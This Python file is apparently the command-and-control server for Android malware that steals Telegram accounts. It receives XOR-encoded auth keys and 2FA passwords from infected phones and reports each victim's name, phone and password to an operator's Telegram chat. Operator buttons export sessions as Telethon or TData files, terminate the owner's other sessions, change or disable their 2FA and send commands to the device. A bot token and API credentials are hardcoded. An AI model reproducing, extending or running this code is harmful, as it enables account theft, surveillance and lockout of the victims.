import asyncio
import os
import shutil
import sqlite3
import json
from pathlib import Path
from collections import defaultdict
from time import time
import uuid

import websockets
from loguru import logger
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, FSInputFile, InlineKeyboardMarkup
from aiogram.filters import CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from telethon import TelegramClient
from telethon.errors import AuthKeyUnregisteredError
from telethon.tl import functions as tl_functions
# from opentele.td import TDesktop, Account  # lazy import inside function
# from opentele.td.configs import DcId       # lazy import inside function
# from opentele.td.auth import AuthKey, AuthKeyType  # lazy import inside function
# from opentele.api import API               # lazy import inside function

import database

# --- НАСТРОЙКИ ---
BOT_TOKEN = "8493972298:AAE-vGFFw2cg6xOmgS0ockeeBHMaAa5mv7s"
CHAT_ID = -1002860708213
API_ID = 6
API_HASH = "eb06d4abfb49dc3eeb1aeb98ae0f581e"

WS_HOST = "0.0.0.0"
WS_PORT = 9087
WS_PATH = "/ws"
XOR_KEY = b"your_secret_xor_key"
AUTH_TOKEN = "your_super_secret_auth_token"

MAX_CONNECTIONS_PER_IP = 5
CONNECTION_TIMEFRAME = 60
# -----------------

# --- Глобальные переменные ---
CONNECTED_CLIENTS = {}
CONNECTION_ATTEMPTS = defaultdict(list)
TEMP_ROOT = Path("temp_sessions")

# --- Настройка логирования ---
logger.add("c2_server.log", rotation="10 MB", retention="7 days", level="INFO")

# --- ИНТЕГРИРОВАННЫЕ КОНВЕРТЕРЫ (ТВОЙ КОД) ---

DC_IP_MAP = {
    1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100",
    4: "149.154.167.91", 5: "91.108.56.130",
}

class Change2FAStates(StatesGroup):
    waiting_current = State()
    waiting_new = State()

def create_telethon_session_file(session_file_path: Path, auth_key_hex: str, dc_id: int):
    auth_key = bytes.fromhex(auth_key_hex)
    server_address = DC_IP_MAP[dc_id]
    if session_file_path.exists(): session_file_path.unlink()
    with sqlite3.connect(session_file_path) as conn:
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE version (version INTEGER PRIMARY KEY);")
        cursor.execute("INSERT INTO version (version) VALUES (?);", (7,))
        cursor.execute("CREATE TABLE sessions (dc_id INTEGER PRIMARY KEY, server_address TEXT, port INTEGER, auth_key BLOB, takeout_id INTEGER);")
        cursor.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, NULL);", (dc_id, server_address, 443, auth_key))
        cursor.execute("CREATE TABLE entities (id INTEGER PRIMARY KEY, hash INTEGER NOT NULL, username TEXT, phone INTEGER, name TEXT, date INTEGER);")
        cursor.execute("CREATE TABLE sent_files (md5_digest BLOB, file_size INTEGER, type INTEGER, id INTEGER, hash INTEGER, PRIMARY KEY(md5_digest, file_size, type));")
        cursor.execute("CREATE TABLE update_state (id INTEGER PRIMARY KEY, pts INTEGER, qts INTEGER, date INTEGER, seq INTEGER);")
        conn.commit()
    logger.info(f"Файл сессии Telethon создан: {session_file_path}")


def create_tdata_from_hex(auth_key_hex: str, dc_id: int, user_id: int, output_folder: Path):
    try:
        from opentele.td import TDesktop, Account
        from opentele.td.configs import DcId
        from opentele.td.auth import AuthKey, AuthKeyType
        from opentele.api import API
    except Exception as import_error:
        raise RuntimeError(f"OpenTele недоступен: {import_error}")

    auth_key_bytes = bytes.fromhex(auth_key_hex)
    dc_id_obj = DcId(dc_id)
    auth_key = AuthKey(auth_key_bytes, AuthKeyType.ReadFromFile, dc_id_obj)
    client = TDesktop()
    client._TDesktop__generateLocalKey()
    account = Account(owner=client, api=API.TelegramDesktop)
    account._setMtpAuthorizationCustom(dc_id_obj, user_id, [auth_key])
    client._addSingleAccount(account)
    output_folder.mkdir(parents=True, exist_ok=True)
    client.SaveTData(output_folder / "tdata")
    logger.info(f"tdata успешно сохранена в {output_folder / 'tdata'}")

# --- Вспомогательные функции и защита ---

def xor_cipher(data: bytes) -> bytes:
    key = XOR_KEY
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def is_rate_limited(ip: str) -> bool:
    current_time = time()
    # FIX: use CONNECTION_TIMEFRAME instead of undefined TIMEFRAME
    CONNECTION_ATTEMPTS[ip] = [t for t in CONNECTION_ATTEMPTS[ip] if current_time - t < CONNECTION_TIMEFRAME]
    if len(CONNECTION_ATTEMPTS[ip]) >= MAX_CONNECTIONS_PER_IP:
        logger.warning(f"Rate limit exceeded for IP: {ip}")
        return True
    CONNECTION_ATTEMPTS[ip].append(current_time)
    return False

# --- Логика обработки сессий ---
async def process_credentials(bot: Bot, data: dict):
    android_id = data.get("android_id", "unknown_id")
    auth_key_hex = data.get("auth_key_hex")
    dc_id = data.get("dc_id")
    provided_password = data.get("password") or None
    session_uuid = str(uuid.uuid4())
    temp_dir = TEMP_ROOT / session_uuid
    temp_dir.mkdir(parents=True, exist_ok=True)
    
    logger.info(f"Processing credentials from Android ID: {android_id}")

    session_file_path = temp_dir / f"{session_uuid}.session"
    client = None
    try:
        create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
        client = TelegramClient(str(session_file_path), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        if not me:
            raise ConnectionError("Session is invalid (get_me failed)")

        database.add_session(session_uuid, android_id, auth_key_hex, int(dc_id), me.id, provided_password)
        logger.success(f"Valid session {session_uuid} for user {me.id} saved to DB.")

        user_info = (
            f"✅ *Новая валидная сессия!*\n\n"
            f"👤 *Имя:* `{me.first_name or 'N/A'} {me.last_name or ''}`\n"
            f"📞 *Телефон:* `{me.phone or 'N/A'}`\n"
            f"🆔 *Username:* `@{me.username or 'N/A'}`\n"
            f"⭐ *Premium:* `{'Да' if me.premium else 'Нет'}`\n"
            f"🚫 *Ограничения:* `{'Да' if me.restricted else 'Нет'}`\n"
            f"🔑 *2FA Пароль:* `{provided_password or 'N/A'}`\n\n"
            f"💻 *Устройство:* `{data.get('device_info', 'N/A')}`\n"
            f"📱 *Android ID:* `{android_id}`\n"
            f"_UUID сессии:_ `{session_uuid}`"
        )
        
        builder = InlineKeyboardBuilder()
        builder.button(text="Проверить", callback_data=f"check:{session_uuid}")
        builder.button(text=".session", callback_data=f"convert:telethon:{session_uuid}")
        builder.button(text="TData", callback_data=f"convert:tdata:{session_uuid}")
        builder.button(text="Сброс др. сессий", callback_data=f"terminate_others:{session_uuid}")
        builder.button(text="Сменить 2FA", callback_data=f"change2fa:{session_uuid}")
        builder.button(text="🗑 Сбросить", callback_data=f"reset:{android_id}")
        # 2 кнопки в ряд
        builder.adjust(3, 3)

        await bot.send_message(CHAT_ID, user_info, parse_mode="Markdown", reply_markup=builder.as_markup())

    except Exception as e:
        logger.error(f"Failed to process credentials for {android_id}: {e}")
        error_caption = f"❌ *Ошибка обработки сессии*\n\n*Android ID:* `{android_id}`\n*Причина:* `{e}`"
        await bot.send_message(CHAT_ID, error_caption, parse_mode="Markdown")
    finally:
        if client and client.is_connected():
            await client.disconnect()
        if temp_dir.exists():
            shutil.rmtree(temp_dir)

# --- Обработчики WebSocket ---
async def c2_handler(websocket: websockets.WebSocketServerProtocol, bot: Bot):
    # Correct access to headers and remote address across websockets versions
    remote = getattr(websocket, "remote_address", None)
    ip = remote[0] if isinstance(remote, (list, tuple)) and remote else "unknown"
    headers = getattr(websocket, "request_headers", {})
    
    if is_rate_limited(ip):
        await websocket.close(1008, "Rate limit exceeded")
        return

    token = headers.get('X-Auth-Token') if hasattr(headers, 'get') else None
    android_id = headers.get('X-Android-ID', 'unknown') if hasattr(headers, 'get') else 'unknown'
    
    if token != AUTH_TOKEN:
        logger.warning(f"HONEYPOT: Failed auth attempt from {ip} with token '{token}'")
        honeypot_alert = (
            f"🍯 *Обнаружена активность в ловушке!*\n\n"
            f"*IP:* `{ip}`\n"
            f"*Причина:* Неверный токен авторизации\n"
            f"*User-Agent:* `{headers.get('User-Agent', 'N/A') if hasattr(headers, 'get') else 'N/A'}`"
        )
        await bot.send_message(CHAT_ID, honeypot_alert, parse_mode="Markdown")
        await websocket.close(1008, "Invalid auth token")
        return

    if android_id not in CONNECTED_CLIENTS:
        logger.success(f"New client connected: {android_id} from {ip}")
    CONNECTED_CLIENTS[android_id] = websocket
    
    try:
        async for message in websocket:
            # Ensure we work with bytes for XOR
            if isinstance(message, str):
                message = message.encode('utf-8')
            decrypted_data = xor_cipher(message)
            try:
                data = json.loads(decrypted_data.decode('utf-8'))
            except Exception as json_error:
                logger.warning(f"Failed to decode JSON from client {android_id}: {json_error}")
                continue
            
            if data.get("type") == "credentials":
                await process_credentials(bot, data)

    except websockets.exceptions.ConnectionClosed:
        logger.info(f"Client disconnected: {android_id}")
    finally:
        if android_id in CONNECTED_CLIENTS:
            del CONNECTED_CLIENTS[android_id]

# --- Обработчики Telegram бота (aiogram) ---
dp = Dispatcher(storage=MemoryStorage())

@dp.message(CommandStart())
async def command_start_handler(message: Message):
    await message.answer(f"✅ C2-сервер (v16, +аккаунт-махинации) активен.\nВаш Chat ID: `{message.chat.id}`", parse_mode="Markdown")

@dp.callback_query(F.data.startswith("convert:"))
async def handle_conversion_callback(query: CallbackQuery):
    await query.answer("Загружаю сессию из БД и конвертирую...")
    _, convert_to, session_uuid = query.data.split(":")
    
    session_data = database.get_session_data(session_uuid)
    if not session_data:
        return await query.message.reply("❌ Сессия не найдена в БД.")
    
    auth_key_hex, dc_id, user_id, _twofa = session_data
    temp_dir = TEMP_ROOT / f"convert_{session_uuid}"
    temp_dir.mkdir(exist_ok=True)

    try:
        if convert_to == "telethon":
            file_path = temp_dir / "telethon.session"
            create_telethon_session_file(file_path, auth_key_hex, dc_id)
            await query.message.reply_document(FSInputFile(file_path))

        elif convert_to == "tdata":
            create_tdata_from_hex(auth_key_hex, dc_id, user_id, temp_dir)
            tdata_folder = temp_dir / "tdata"
            zip_path = shutil.make_archive(str(temp_dir / "tdata_archive"), 'zip', tdata_folder)
            await query.message.reply_document(FSInputFile(zip_path))
        
    except Exception as e:
        logger.error(f"Conversion failed for {session_uuid} to {convert_to}: {e}")
        await query.message.reply(f"❌ Ошибка конвертации: `{e}`", parse_mode="Markdown")
    finally:
        if temp_dir.exists():
            shutil.rmtree(temp_dir)

@dp.callback_query(F.data.startswith("check:"))
async def handle_check_callback(query: CallbackQuery):
    _, session_uuid = query.data.split(":")
    session_data = database.get_session_data(session_uuid)
    if not session_data:
        await query.answer("Сессия не найдена в БД!", show_alert=True)
        return await query.message.edit_text(query.message.text + "\n\n*⚠️ Сессия была удалена с сервера.*", parse_mode="Markdown")

    await query.answer("Проверяю сессию...", show_alert=False)
    auth_key_hex, dc_id, _user_id, _twofa = session_data
    temp_dir = TEMP_ROOT / f"check_{session_uuid}"
    temp_dir.mkdir(exist_ok=True)
    
    session_file_path = temp_dir / "check.session"
    client = None
    try:
        create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
        client = TelegramClient(str(session_file_path), API_ID, API_HASH)
        await client.connect()
        is_authorized = await client.is_user_authorized()
        if not is_authorized:
            raise AuthKeyUnregisteredError
        
        await query.answer("✅ Сессия валидна!", show_alert=True)
        
    except Exception as e:
        logger.warning(f"Check failed for session {session_uuid}: {e}")
        await query.answer("❌ Сессия невалидна и будет удалена!", show_alert=True)
        database.remove_session_from_db(session_uuid)
        await query.message.edit_text(query.message.text + "\n\n*❌ Сессия оказалась невалидной и была удалена с сервера.*", parse_mode="Markdown", reply_markup=None)
    finally:
        if client and client.is_connected():
            await client.disconnect()
        if temp_dir.exists():
            shutil.rmtree(temp_dir)

@dp.callback_query(F.data.startswith("reset:"))
async def handle_reset_callback(query: CallbackQuery):
    await query.answer("Отправляю команду на сброс...")
    _, android_id = query.data.split(":")
    
    websocket = CONNECTED_CLIENTS.get(android_id)
    if websocket and websocket.open:
        command = {"action": "reset_session"}
        encrypted_command = xor_cipher(json.dumps(command).encode('utf-8'))
        await websocket.send(encrypted_command)
        
        await query.message.edit_text(query.message.text + f"\n\n*✅ Команда на сброс отправлена устройству `{android_id}`.*", parse_mode="Markdown")
    else:
        await query.message.reply(f"❌ Устройство `{android_id}` не в сети. Команда не может быть доставлена.", parse_mode="Markdown")

@dp.callback_query(F.data.startswith("terminate_others:"))
async def handle_terminate_others(query: CallbackQuery):
    await query.answer("Сбрасываю другие сессии...")
    _, session_uuid = query.data.split(":")
    session_data = database.get_session_data(session_uuid)
    if not session_data:
        return await query.message.reply("❌ Сессия не найдена в БД.")

    auth_key_hex, dc_id, _user_id, _twofa = session_data
    temp_dir = TEMP_ROOT / f"terminate_{session_uuid}"
    temp_dir.mkdir(exist_ok=True)

    session_file_path = temp_dir / "terminate.session"
    client = None
    try:
        create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
        client = TelegramClient(str(session_file_path), API_ID, API_HASH)
        await client.connect()
        await client(tl_functions.auth.ResetAuthorizationsRequest())
        await query.message.reply("✅ Все другие сессии завершены. Эта сессия осталась активной.")
    except Exception as e:
        logger.error(f"Terminate others failed for {session_uuid}: {e}")
        await query.message.reply(f"❌ Не удалось завершить другие сессии: `{e}`", parse_mode="Markdown")
    finally:
        if client and client.is_connected():
            await client.disconnect()
        if temp_dir.exists():
            shutil.rmtree(temp_dir)

@dp.callback_query(F.data.startswith("change2fa:"))
async def handle_change2fa_start(query: CallbackQuery, state: FSMContext):
    await query.answer("Начинаю смену 2FA...")
    _, session_uuid = query.data.split(":")
    session_data = database.get_session_data(session_uuid)
    if not session_data:
        return await query.message.reply("❌ Сессия не найдена в БД.")

    _auth_key_hex, _dc_id, _user_id, saved_twofa = session_data
    await state.update_data(session_uuid=session_uuid, initiator_user_id=query.from_user.id)

    if saved_twofa:
        # Используем сохранённый пароль и сразу переходим к запросу нового
        await state.update_data(current_password=saved_twofa)
        await state.set_state(Change2FAStates.waiting_new)
        await query.message.reply("Отправьте новый 2FA пароль, или 'none' для отключения 2FA.")
    else:
        await state.set_state(Change2FAStates.waiting_current)
        await query.message.reply("Введите текущий 2FA пароль, или отправьте 'none' если 2FA не установлен.")

@dp.message(Change2FAStates.waiting_current)
async def handle_change2fa_current(message: Message, state: FSMContext):
    data = await state.get_data()
    initiator_user_id = data.get("initiator_user_id")
    if message.from_user and message.from_user.id != initiator_user_id:
        return  # Игнорируем сообщения не инициатора

    current_raw = (message.text or "").strip()
    current_password = None if current_raw.lower() == 'none' else current_raw
    await state.update_data(current_password=current_password)
    await state.set_state(Change2FAStates.waiting_new)
    await message.reply("Введите новый 2FA пароль, или отправьте 'none' чтобы отключить 2FA.")

@dp.message(Change2FAStates.waiting_new)
async def handle_change2fa_new(message: Message, state: FSMContext):
    data = await state.get_data()
    initiator_user_id = data.get("initiator_user_id")
    if message.from_user and message.from_user.id != initiator_user_id:
        return  # Игнорируем сообщения не инициатора

    session_uuid = data.get("session_uuid")
    current_password = data.get("current_password")
    new_raw = (message.text or "").strip()
    new_password = None if new_raw.lower() == 'none' else new_raw

    session_data = database.get_session_data(session_uuid)
    if not session_data:
        await state.clear()
        return await message.reply("❌ Сессия не найдена в БД.")

    auth_key_hex, dc_id, _user_id, _twofa = session_data
    temp_dir = TEMP_ROOT / f"change2fa_{session_uuid}"
    temp_dir.mkdir(exist_ok=True)

    session_file_path = temp_dir / "change2fa.session"
    client = None
    try:
        create_telethon_session_file(session_file_path, auth_key_hex, dc_id)
        client = TelegramClient(str(session_file_path), API_ID, API_HASH)
        await client.connect()
        await client.edit_2fa(new_password=new_password, current_password=current_password)
        # Сохраняем новый пароль (или очищаем)
        database.set_session_twofa_password(session_uuid, new_password)
        if new_password is None:
            await message.reply("✅ 2FA пароль отключён.")
        else:
            await message.reply("✅ 2FA пароль успешно изменён.")
    except Exception as e:
        logger.error(f"Change 2FA failed for {session_uuid}: {e}")
        await message.reply(f"❌ Не удалось изменить 2FA: `{e}`", parse_mode="Markdown")
    finally:
        if client and client.is_connected():
            await client.disconnect()
        if temp_dir.exists():
            shutil.rmtree(temp_dir)
        await state.clear()

# --- Главная функция запуска ---
async def main():
    database.initialize_database()
    TEMP_ROOT.mkdir(exist_ok=True)
    
    bot = Bot(token=BOT_TOKEN)
    
    # Provide a handler compatible with multiple websockets versions
    async def handler(websocket, *args):
        await c2_handler(websocket, bot)

    ws_server = await websockets.serve(
        handler,
        WS_HOST, WS_PORT
    )
    logger.info(f"C2 WebSocket Server started on ws://{WS_HOST}:{WS_PORT}")

    await dp.start_polling(bot)

if __name__ == "__main__":
    logger.info("Starting C2 server...")
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Server shutting down.")
